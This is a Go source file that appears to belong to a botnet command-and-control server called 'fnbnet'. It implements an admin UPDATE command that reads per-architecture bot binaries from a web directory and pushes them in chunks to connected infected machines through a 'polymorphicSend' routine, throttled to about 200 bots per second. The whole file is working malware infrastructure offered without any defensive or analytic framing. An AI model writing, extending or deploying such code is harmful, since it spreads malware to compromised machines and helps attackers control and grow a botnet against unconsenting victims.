package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const updateBinsDir = "/var/www/html/bins"

func handleUpdateCommand(admin *Admin, args string) {
	if args == "" {
		admin.conn.Write([]byte("Usage: UPDATE <id/all/arch> [arch]\r\n"))
		admin.conn.Write([]byte("  UPDATE all       - update all bots\r\n"))
		admin.conn.Write([]byte("  UPDATE x86       - update bots matching arch\r\n"))
		admin.conn.Write([]byte("  UPDATE all arm7   - send arm7 binary (default: auto from arch list)\r\n"))
		return
	}

	parts := strings.Fields(args)
	if len(parts) == 0 {
		return
	}

	target := parts[0]
	arch := "x86"
	if len(parts) >= 2 {
		arch = parts[1]
	}

	binPath := filepath.Join(updateBinsDir, "fnbnet."+arch)
	binData, err := os.ReadFile(binPath)
	if err != nil {
		admin.conn.Write([]byte(fmt.Sprintf("Binary not found: %s\r\n", binPath)))
		return
	}

	admin.conn.Write([]byte(fmt.Sprintf("Sending %s (%d bytes) to bots...\r\n", binPath, len(binData))))

	sentCount := 0
	clientList.ForEachClient(func(cli *Bot) {
		if target != "all" && target != cli.source && target != fmt.Sprintf("%d", cli.uid) {
			return
		}
		if cli.conn == nil || cli.ctx == nil || !cli.ctx.Valid {
			return
		}
		sendBinaryToBot(cli.conn, cli.ctx, binData)
		sentCount++
		// throttle: 5ms between bots = max 200 bots/sec
		time.Sleep(5 * time.Millisecond)
	})

	admin.conn.Write([]byte(fmt.Sprintf("Sent to %d bots\r\n", sentCount)))
}

func sendBinaryToBot(conn net.Conn, ctx *HandshakeCtx, data []byte) {
	totalSize := uint32(len(data))
	sent := uint32(0)
	chunkID := uint32(0)

	for sent < totalSize {
		chunkLen := UpdateChunkSize
		if int(sent)+chunkLen > len(data) {
			chunkLen = len(data) - int(sent)
		}

		var payload []byte
		if chunkID == 0 {
			payload = make([]byte, 4+chunkLen)
			binary.BigEndian.PutUint32(payload[0:4], totalSize)
			copy(payload[4:], data[sent:sent+uint32(chunkLen)])
		} else {
			payload = make([]byte, chunkLen)
			copy(payload, data[sent:sent+uint32(chunkLen)])
		}

		polymorphicSend(conn, ctx, PktTypeUpdate, 0, payload)
		sent += uint32(chunkLen)
		chunkID++
	}

	polymorphicSend(conn, ctx, PktTypeUpdateDone, 0, nil)
	time.Sleep(10 * time.Millisecond)
}
